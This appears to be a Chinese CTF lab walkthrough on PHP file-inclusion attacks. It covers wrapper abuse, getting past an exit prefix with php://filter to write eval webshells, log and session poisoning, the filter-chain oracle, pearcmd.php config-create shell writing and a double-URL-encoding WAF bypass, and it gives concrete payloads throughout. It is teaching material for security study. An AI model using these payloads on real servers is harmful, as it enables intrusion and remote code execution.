# PHPinclude-labs

## Level 1: PHP 封装协议

PHP 提供了一些内置的 URL 风格的封装协议（wrappers），可用于结合文件系统函数（如 `include`, `require`, `file_get_contents` 等）实现不同的功能。

### `file://` — 访问本地文件系统

*   **功能**: 访问服务器本地文件系统。
*   **路径**: 必须使用绝对路径。
*   **执行**: 如果包含的文件内容符合 PHP 代码格式，可能会被执行（取决于包含函数）。
*   **依赖**:
    *   `allow_url_fopen`: On/Off (影响部分函数，但 `include`/`require` 通常不受此限制)
    *   `allow_url_include`: 无特定要求

### `data://` — 数据流访问

*   **功能**: 将指定的数据（文本或 base64 编码）作为数据流访问。
*   **执行**: 如果数据流内容是有效的 PHP 代码，并且被 `include`/`require` 等函数包含，代码会被执行。
*   **格式**:
    *   文本: `data://text/plain,<?php phpinfo();?>`
    *   Base64: `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8=` (`<?php phpinfo();?>` 的 base64 编码)
*   **依赖**:
    *   `allow_url_fopen`: On
    *   `allow_url_include`: On

### `http://` 与 `https://` — 访问 HTTP(s) URL

*   **功能**: 通过 HTTP/HTTPS 协议访问远程文件或资源。通常用于远程文件包含 (RFI)。
*   **方法**: 通常使用 HTTP 1.0 GET 方法，以只读方式访问。
*   **依赖**:
    *   `allow_url_fopen`: On
    *   `allow_url_include`: On (用于 `include`/`require` 等函数进行远程包含)

### `php://` — 访问各个输入/输出流

这是 PHP 中功能最强大的协议之一。

#### `php://input`

*   **功能**: 访问请求的原始数据 (raw request body) 的只读流。
*   **用途**: 常用于代码执行，将 PHP 代码放在 POST 请求的 Body 中，然后通过 `include('php://input');` 执行。
*   **限制**: 当 `enctype="multipart/form-data"` 时无效。
*   **依赖**:
    *   `allow_url_include`: On
*   **注意**: `php://input` 读取的是原始请求体，不能通过常规的 `$_POST` 方式提交数据（如使用 Hackbar 的 POST 参数字段）。需要使用支持发送 Raw Body 的工具（如 Burp Suite Repeater, curl）。

#### `php://filter` (PHP >= 5.0.0)

*   **功能**: 用于在读取或写入流数据时应用一个或多个过滤器。常用于读取文件源码（绕过直接输出）、数据转换，甚至在特定条件下执行代码。
*   **参数格式**: `php://filter/[<过滤器链>]/resource=<目标资源>`
    *   `resource=<要过滤的数据流>`: **必需**。指定要过滤的目标资源 (e.g., `flag.php`, `php://input`)。
    *   `read=<读链过滤器列表>`: 可选。应用于读取操作的过滤器，用 `|` 分隔。
    *   `write=<写链过滤器列表>`: 可选。应用于写入操作的过滤器，用 `|` 分隔。
    *   `<过滤器列表>`: 如果没有 `read=` 或 `write=` 前缀，则根据操作（读/写）应用。
*   **常用过滤器**:
    *   **字符串过滤器**:
        *   `string.rot13`: ROT13 变换。
        *   `string.toupper`: 转大写。
        *   `string.tolower`: 转小写。
        *   `string.strip_tags`: (PHP < 7.3.0) 去除 HTML 和 PHP 标签。
    *   **转换过滤器**:
        *   `convert.base64-encode` / `convert.base64-decode`: Base64 编解码。
        *   `convert.quoted-printable-encode` / `convert.quoted-printable-decode`: Quoted-Printable 编解码。
        *   `convert.iconv.*`: 字符集转换 (e.g., `convert.iconv.UTF-8.UCS-2`)。
*   **依赖**:
    *   一般无依赖。
    *   若利用过滤链进行代码执行（如配合 `php://temp`），可能需要 `allow_url_include`: On。

---

## Level 2: 文件系统函数与封装协议

除了 `include`/`require` 类函数，其他文件系统函数也可以利用 PHP 封装协议。

*   **`file_get_contents()`**: 读取文件内容。
    *   示例 (ROT13 读取): `file_get_contents('php://filter/read=string.rot13/resource=flag.php');`
    *   示例 (Base64 读取): `file_get_contents('php://filter/read=convert.base64-encode/resource=flag.php');`
*   **`file_put_contents()`**: 写入文件内容。
    *   示例 (写入 Base64 解码后的内容): `file_put_contents('shell.php', $data, 0, stream_context_create(['php' => ['filter' => ['write' => 'convert.base64-decode']]]));`
    *   或者直接在文件名中使用 filter (更常见于 CTF): `file_put_contents('php://filter/write=convert.base64-decode/resource=shell.php', $base64_encoded_data);`
*   **`readfile()`**: 读取文件并输出到输出缓冲。
    *   示例 (Base64 读取并输出): `readfile('php://filter/read=convert.base64-encode/resource=flag.php');`

---

## Level 3: 死亡绕过 (Bypassing `<?php exit; ?>`)

考虑以下场景，代码试图在用户写入的内容前添加 `exit` 来阻止 Webshell 执行：

```php
<?php
$content = '<?php exit; ?>';
$content .= $_POST['txt']; // User-controlled content
file_put_contents($_POST['filename'], $content); // User-controlled filename
?>
```

如果 `$_POST['filename']` 可控，可以使用 `php://filter` 配合特定过滤器绕过 `<?php exit; ?>`。

### 利用 `base64-decode`

*   **原理**: PHP 的 `base64_decode` 函数会忽略无效的 Base64 字符。
*   **方法**: 设置文件名为 `php://filter/write=convert.base64-decode/resource=shell.php`。提交的 `$_POST['txt']` 为 Webshell 的 Base64 编码。
*   **过程**:
    1.  最终写入的数据是 `'<?php exit; ?>' . base64_encode($webshell)`。
    2.  `convert.base64-decode` 过滤器尝试解码整个 `$content`。
    3.  `<?php exit; ?>` 中的 `<`, `>`, `?`, `;`, 空格 等字符不是有效的 Base64 字符，会被忽略。
    4.  实际被解码的部分近似于 `phpexit` + `base64_encode($webshell)`。
    5.  为了让 `phpexit` 能被正常解码（Base64 按 4 字节块处理），可以在 `$_POST['txt']` 的 Base64 编码前添加一个字符（如 `a`），使得 `phpexit` + `a` 凑成 8 个字符（两个 Base64 块）。`phpexita` 会被解码成无意义的二进制数据。
    6.  紧随其后的 Webshell 的 Base64 编码会被正常解码，从而写入有效的 Webshell 文件，去除了前面的 `exit`。

### 利用 `strip_tags`

*   **原理**: `string.strip_tags` 过滤器可以去除 PHP 和 HTML 标签。
*   **方法**: 使用过滤器链，先剥离标签，再 Base64 解码。文件名为 `php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php`。提交的 `$_POST['txt']` 仍为 Webshell 的 Base64 编码。
*   **过程**:
    1.  `string.strip_tags` 应用于 `$content = '<?php exit; ?>' . base64_encode($webshell)`。
    2.  `<?php exit; ?>` 被去除。
    3.  `convert.base64-decode` 应用于剩下的 `base64_encode($webshell)`，将其解码还原成 Webshell。

### 利用 `rot13`

*   **原理**: `string.rot13` 对 `<?php exit; ?>` 编码后得到 `<?cuc rkvg; ?>`。
*   **方法**: 设置文件名为 `php://filter/write=string.rot13/resource=shell.php`。提交的 `$_POST['txt']` 为经过 ROT13 编码的 Webshell。
*   **过程**:
    1.  整个 `$content` 被 ROT13 编码。`<?php exit; ?>` 变为 `<?cuc rkvg; ?>`。
    2.  如果服务器 PHP 配置中 `short_open_tag` 未开启，PHP 不会识别 `<?cuc` 作为代码起始标记，因此不会执行 `exit`。
    3.  后面被 ROT13 编码的 Webshell 也被写入文件。访问该文件时，如果能再用 `php://filter/read=string.rot13/resource=shell.php` 包含，就能执行。

### 利用 `iconv`

*   **原理**: 对于iconv字符编码转换进行绕过的手法，其实类似于上面所述的base64编码手段，都是先对原有字符串进行某种编码然后再解码，这个过程导致最初的限制exit;去除，而我们的恶意代码正常解码存储。
*   **方法**: 通过UCS-2方式，对目标字符串进行2位一反转（这里的2LE和2BE可以看作是小端和大端的列子），也就是说构造的恶意代码需要是UCS-2中2的倍数，不然不能进行正常反转（多余不满足的字符串会被截断），那我们就可以利用这种过滤器进行编码转换绕过了。
*   **过程**:
    1.  echo iconv("UCS-2LE","UCS-2BE",'<?php @eval($_POST[ab]);?>');
    2.  php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php     ?<hp pe@av(l_$OPTSa[]b;)>?
    3.  ?<hp pxeti)(p;ph/:f/liet/rocvnre.tcino.vCU-SL2.ECU-SB2|E<?php @eval($_POST[ab]);?>r/seuocr=ehsle.lhp
*   **注**: 
    usc-4:php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?<e@ p(lavOP_$a[TS]dcb>?;)/resource=shell.php
    utf8-utf7:php://filter/write=aaaaXDw/cGhwIEBldmFsKCRfUE9TVFthXSk7ID8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.php
---

---

## Level 4: 日志文件包含

当 `php://` 等封装协议被禁用或过滤时，包含日志文件是一种常见的获取 Shell 的方法。

*   **前提**: 需要知道日志文件的绝对路径，并有权限读取。
*   **常见日志路径**:
    *   Nginx: `/var/log/nginx/access.log`, `/var/log/nginx/error.log`
    *   Apache: `/var/log/apache2/access.log`, `/var/log/apache2/error.log` (Debian/Ubuntu) 或 `/var/log/httpd/access_log` (CentOS/RHEL)
*   **注入**: 向服务器发送请求，将 PHP 代码（Webshell）注入到请求的某个部分，如 User-Agent、URL 参数、POST 数据等，使其被记录到日志文件中。
*   **包含**: 通过文件包含漏洞包含日志文件，例如 `index.php?file=/var/log/nginx/access.log`。服务器解析日志文件时，会执行其中注入的 PHP 代码。
*   **PHP 标签**: 可以尝试多种 PHP 标签格式进行注入：
    *   `<?php ... ?>` (常用)
    *   `<?= ... ?>` (短标签，等同于 `<?php echo ... ?>`, 通常有效)
    *   `<script language="php"> ... </script>` (长标签)
    *   `<? ... ?>` (短标签，需要 `short_open_tag=On`)
    *   `<% ... %>`, `<%= ... %>` (ASP 风格标签，需要 `asp_tags=On`)
    *   **注意**: `<?`, `<%`, `<%=`, `<script language="php">` 在 PHP 7.0.0 及以后版本被移除。`<?= ?>` 始终可用（自 PHP 5.4 起）。

---

## Level 5: Session 文件包含

利用 Session 文件存储机制，将 Webshell 写入 Session 文件，然后包含该文件。

*   **Session 文件**: PHP Session 数据默认以文件形式存储。
*   **存储位置**: 通常在 `/var/lib/php/sessions/` (Debian/Ubuntu), `/tmp/` 或 `php.ini` 中 `session.save_path` 指定的目录。
*   **文件名**: 一般格式为 `sess_[PHPSESSID]`，其中 `[PHPSESSID]` 是 Session ID。
*   **写入方法**:
    1.  **控制 Session 内容**: 如果 PHP 代码允许用户控制 Session 变量的值，可以直接将 PHP 代码写入 Session。
    2.  **利用 `session.upload_progress`**: (需要 `session.upload_progress.enabled=On`)
        *   在文件上传请求中，如果包含一个名为 `PHP_SESSION_UPLOAD_PROGRESS` 的 POST 字段，PHP 会在 Session 文件中创建一个键，其名称由 `session.upload_progress.name` (`PHP_SESSION_UPLOAD_PROGRESS` 是默认值) 决定，其值是用户在 POST 请求中为该字段提供的值。
        *   可以构造一个包含此字段的上传表单，将 Webshell 作为该字段的值。
        ```html
        <!doctype html>
        <html>
        <body>
        <form action="http://TARGET_URL/index.php" method="post" enctype="multipart/form-data">
            <!-- 将 Webshell 放入 value -->
            <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="<?php phpinfo(); ?>" />
            <input type="file" name="file" />
            <input type="submit" />
        </form>
        </body>
        </html>
        ```
    3.  **竞争条件 (Race Condition)**: 由于 Session 文件在请求结束时可能被清理或覆盖，通常需要利用竞争条件：一个线程不断发送包含 Webshell 的上传请求（写入 Session），另一个线程不断尝试包含 Session 文件。
        *   可以使用 Python 脚本（如笔记中提供的 `requests` + `threading` 示例）来实现自动化。
*   **包含**: 需要知道 Session 文件的完整路径（包括 Session ID），然后通过文件包含漏洞进行包含，如 `index.php?file=/var/lib/php/sessions/sess_YOUR_SESSION_ID`。

---

## Level 6: Error-Based Oracle (via Filters)

一种高级的文件读取技术，利用 `php://filter` 的某些过滤器（特别是 `iconv` 和 `dechunk`）结合 PHP 处理流时可能产生的错误（如内存耗尽）来逐字节地泄露文件内容。

*   **核心思想**:
    1.  **`iconv` 过滤器**: 通过选择特定的输入输出编码（如 UTF-8 到 UCS-2/UCS-4 等），可以使流数据大小指数级增长，触发内存限制错误。
    2.  **`dechunk` 过滤器**: 通常用于处理 HTTP chunked 编码，但在这里被用来尝试确定文件的第一个字符（基于错误发生与否）。
    3.  **字节序交换**: 再次使用 `iconv`，利用不同字节序的编码（如 UCS-2LE vs UCS-2BE）将文件的后续字符与已确定的第一个字符进行交换。
    4.  **循环探测**: 重复以上过程，结合错误信息判断，逐个泄露文件内容。
*   **受影响的函数**: 主要是读取文件内容的函数，如 `file_get_contents`, `readfile`, `fgets`, `fread`, `fgetc`, `stream_get_contents`, 以及依赖文件内容处理的函数如 `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents` (读取源文件时), `fgetcsv`, `fpassthru`, `fputs` (读取源文件时)。
*   **工具**: 有现成的 PoC 或利用工具，例如 [php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit)。

---

## Level 7: 绕过 `require_once`/`include_once` 限制

`require_once` 和 `include_once` 会记录已包含文件的真实路径，防止同一文件被包含多次。

*   **绕过方法**: 利用符号链接或文件系统的特性，使得同一个文件的路径看起来不同。
*   **`/proc/self/root/` 技巧**: 在 Linux 系统中，`/proc/self/` 是当前进程信息的符号链接目录。`/proc/self/root/` 指向进程的根目录。通过嵌套多层 `/proc/self/root/`，可以构造出不同的路径字符串，但最终都指向同一个文件系统根，从而绕过 `*_once` 的路径检查。
*   **示例 Payload**:
    ```
    php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/.../proc/self/root/var/www/html/target_file.php
    ```
    (重复 `/proc/self/root/` 多次)

---

## Level 8: Opcache 缓存文件利用

PHP Opcache 扩展会为 PHP 脚本生成并存储预编译的字节码（缓存文件），以提高性能。

*   **缓存文件**: 当一个 PHP 文件被访问时，如果 Opcache 启用且配置了文件缓存 (`opcache.file_cache` 指令设置了目录)，Opcache 会生成一个 `.bin` 格式的缓存文件。
*   **缓存路径**: 通常是 `<opcache.file_cache 指定的目录>/<SYSTEM_ID>/<脚本的绝对路径>.bin`。
    *   `SYSTEM_ID` 是根据 PHP 版本、Zend 扩展 ID 等信息计算出的哈希值。
*   **利用场景**:
    1.  **源码泄露**: 如果能计算出 `SYSTEM_ID` 并知道目标 PHP 文件的绝对路径，可以尝试直接下载或包含对应的 `.bin` 缓存文件。虽然是字节码，但可能包含足够的信息（如字符串常量）来还原部分或全部源码。
    2.  **RCE (特定情况)**: 在某些旧版本或特定配置下，可能存在直接通过 Opcache 文件实现 RCE 的漏洞，但这不如源码泄露常见。
*   **计算 `SYSTEM_ID`**: 通常需要运行特定的 PHP 脚本来获取当前环境的 `SYSTEM_ID`。

---

## Level 9: 利用 `pearcmd.php`

PEAR (PHP Extension and Application Repository) 和 PECL (PHP Extension Community Library) 是 PHP 的包管理工具。

*   **背景**: 在 PHP 7.3 及更早版本，PEAR/PECL 通常是默认安装的。在 PHP 7.4+ 中需要编译时指定 `--with-pear`。然而，**Docker 官方的 PHP 镜像通常默认安装 PEAR/PECL**，其文件位于 `/usr/local/lib/php/` 目录下。
*   **`pearcmd.php`**: PEAR 的命令行入口脚本。
*   **`register_argc_argv`**: PHP 配置选项，当开启时（Docker PHP 环境通常默认开启），PHP 脚本可以访问命令行参数 `$argc` (参数数量) 和 `$argv` (参数数组)。对于 Web 请求，URL 查询字符串或 POST Body 可以被解析为 `$argv` 的内容（具体行为可能依赖 SAPI）。
*   **利用**: 如果存在文件包含漏洞，并且可以包含 `/usr/local/lib/php/pearcmd.php`，同时 `register_argc_argv` 开启，就可以通过构造 URL 参数来模拟命令行调用 `pearcmd.php` 的功能。
    *   **`config-create` 命令**: `pearcmd.php` 支持 `config-create` 命令，用于创建配置文件。该命令接收两个参数：第一个参数是要写入文件的内容，第二个参数是目标文件路径。
    *   **Payload 构造**: 可以在文件包含的 URL 中，通过 `+` 或其他方式（取决于 PHP 如何解析查询字符串为 `$argv`）传递参数给 `pearcmd.php`。
        例如: `index.php?file=/usr/local/lib/php/pearcmd.php&+config-create+<?php phpinfo();?>+/tmp/shell.php`
        (这里的 `+` 用于分隔参数，实际分隔符可能需要测试)
    *   **目标**: 利用 `config-create` 将 Webshell 内容写入到服务器上可写、可访问的路径。

---

## Level 10: 伪协议读文件二次 URL 编码绕过 WAF

*   **原理**: `include`, `file_get_contents` 等函数在处理传入的 URL (包括 `php://filter` 等封装协议) 时，会自动进行一次 URL 解码。
*   **WAF 绕过**: 如果将 Payload 进行两次 URL 编码，第一次解码由 PHP 函数完成，可能绕过 WAF 的检测。
*   **示例**:
    *   原始 Payload: `php://filter/read=convert.base64-encode/resource=flag.php`
    *   一次 URL 编码: `php%3a%2f%2ffilter%2fread%3dconvert.base64-encode%2fresource%3dflag.php`
    *   二次 URL 编码: `php%253a%252f%252ffilter%252fread%253dconvert.base64-encode%252fresource%253dflag.php`
    *   提交二次编码的 Payload。Web 服务器/PHP 首先进行第一次解码得到一次编码的字符串，然后 `include` 等函数再进行一次解码得到原始 Payload 并执行。